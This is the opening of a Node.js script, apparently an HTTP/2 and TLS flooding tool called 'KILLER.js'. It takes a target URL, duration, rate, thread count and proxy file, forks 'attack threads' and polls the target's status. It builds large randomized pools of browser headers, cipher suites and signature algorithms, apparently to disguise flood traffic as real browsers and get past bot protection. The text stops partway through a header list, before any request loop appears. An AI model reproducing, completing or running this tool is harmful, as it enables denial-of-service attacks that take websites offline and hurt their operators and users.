const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
var path = require("path");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require("fs");
const { HeaderGenerator } = require('header-generator');
const axios = require('axios');
const https = require('https');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
});

if (process.argv.length < 7){console.log(`@fengzzt\n node KILLER.js target time rate thread proxy.txt`); process.exit();}
const headers = {}; // Khởi tạo headers rỗng

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const getCurrentTime = () => {
   const now = new Date();
   const hours = now.getHours().toString().padStart(2, '0');
   const minutes = now.getMinutes().toString().padStart(2, '0');
   const seconds = now.getSeconds().toString().padStart(2, '0');
   return `( Now at ${hours}:${minutes}:${seconds})`;
};

const targetURL = process.argv[2];
const agent = new https.Agent({ rejectUnauthorized: false });

function getStatus() {
    const timeoutPromise = new Promise((resolve, reject) => {
        setTimeout(() => {
            reject(new Error('Request timed out'));
        }, 5000);
    });

    const axiosPromise = axios.get(targetURL, { httpsAgent: agent });

    Promise.race([axiosPromise, timeoutPromise])
        .then((response) => {
            const { status, data } = response;
            console.log(`Info: ${getCurrentTime()} Title: ${getTitleFromHTML(data)} ({status})`);
        })
        .catch((error) => {
            if (error.message === 'Request timed out') {
                console.log(`Info: ${getCurrentTime()} Request Timed Out`);
            } else if (error.response) {
                const extractedTitle = getTitleFromHTML(error.response.data);
                console.log(`Info: ${getCurrentTime()} Title: ${extractedTitle} {error.response.status}`);
            } else {
                console.log(`Info: ${getCurrentTime()} ${error.message}`);
            }
        });
}

function getTitleFromHTML(html) {
    const titleRegex = /<title>(.*?)<\/title>/i;
    const match = html.match(titleRegex);
    if (match && match[1]) {
        return match[1];
    }
    return 'Not Found';
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function getRandomNumberBetween(min,max){
    return Math.floor(Math.random()*(max-min+1)+min);
}

function randomString(length) {
    var result = "";
    var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
} 

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}

if (cluster.isMaster){
    console.clear();
    console.log(`
Tron Network TLS Recode
`);
    console.log(`Info: ${getCurrentTime()}`)
    console.log(`------------------------------------------`)
    console.log(`Target: `+ process.argv[2])
    console.log(`Time: `+ process.argv[3])
    console.log(`Rate: `+ process.argv[4])
    console.log(`Thread: ` + process.argv[5])
    console.log(`Proxy: ` + process.argv[6]) // Sửa lại thành process.argv[6]
    console.log(`------------------------------------------`)
    for (let i = 1; i <= process.argv[5]; i++){
        cluster.fork();
        console.log(`Info:  ${getCurrentTime()} Attack Thread ${i} Started`);
    }
    console.log(`Info:  ${getCurrentTime()} The Attack Has Started`);
    setInterval(getStatus, 2000);
    setTimeout(() => {
        console.log(`Info:  ${getCurrentTime()} The Attack Is Over`);
        process.exit(1);
    }, process.argv[3] * 1000);
} 

let headerGenerator = new HeaderGenerator({
    browsers: [
        { name: "firefox", minVersion: 112, httpVersion: "2" },
        { name: "opera", minVersion: 112, httpVersion: "2" },
        { name: "edge", minVersion: 112, httpVersion: "2" },
        { name: "chrome", minVersion: 112, httpVersion: "2" },
        { name: "safari", minVersion: 16, httpVersion: "2" },
    ],
    devices: [
        "desktop",
        "mobile",
    ],
    operatingSystems: [
        "windows",
        "linux",
        "macos",
        "android",
        "ios",
    ],
    locales: ["en-US", "en"]
});

// Giữ nguyên ciphers và sigalgs vì chúng là các cấu hình TLS hợp lệ
const cplist = [
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK','TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK','TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
];

const sigalgs = [
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    'ecdsa_brainpoolP256r1tls13_sha256',
    'ecdsa_brainpoolP384r1tls13_sha384',
    'ecdsa_brainpoolP512r1tls13_sha512',
    'ecdsa_sha1',
    'ed25519',
    'ed448',
    'ecdsa_sha224',
    'rsa_pkcs1_sha1',
    'rsa_pss_pss_sha256',
    'dsa_sha256',
    'dsa_sha384',
    'dsa_sha512',
    'dsa_sha224',
    'dsa_sha1',
    'rsa_pss_pss_sha384',
    'rsa_pkcs1_sha2240',
    'rsa_pss_pss_sha512',
    'sm2sig_sm3',
    'ecdsa_secp521r1_sha512',
];

const lang_header = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.8',
    'en-AU,en;q=0.7',
    'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
    'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
    'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7',
    'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
